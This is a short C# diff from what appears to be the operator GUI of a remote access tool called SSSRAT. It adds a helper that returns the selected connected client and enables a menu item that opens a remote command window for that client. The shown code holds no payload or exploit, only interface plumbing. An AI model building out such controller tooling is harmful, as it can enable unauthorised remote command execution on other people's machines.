@@ -94,11 +94,15 @@ namespace SSSRAT_GUI {
 			string text = item.Text;
 			for (int x = 0; x < _.clients.Count; x++) {
 				if (text == "ID: " + _.clients[x].id + ", IP: " + _.clients[x].tcp.Client.RemoteEndPoint) {
-					
+
 					return _.clients[x];
 				}
 			}
 			return new Client(UInt32.MaxValue, new TcpClient(), new Thread(KeepAlive), new ListViewItem());
+		}
+
+		Client GetCurrentSelectedClient() {
+			return GetClientByLVItem(list_clients.Items[list_clients.SelectedIndices[0]]);
 		}
 
 		static string delayLog = "";
@@ -217,8 +221,9 @@ namespace SSSRAT_GUI {
 		}
 
 		private void CMDToolStripMenuItemClick(object sender, EventArgs e) {
-			/*var cmd = new FrmCMD();
-			cmd.Init()*/
+			var cmd = new FrmCMD();
+			cmd.Init(GetCurrentSelectedClient());
+			cmd.ShowDialog();
 		}
 		#endregion
 	}
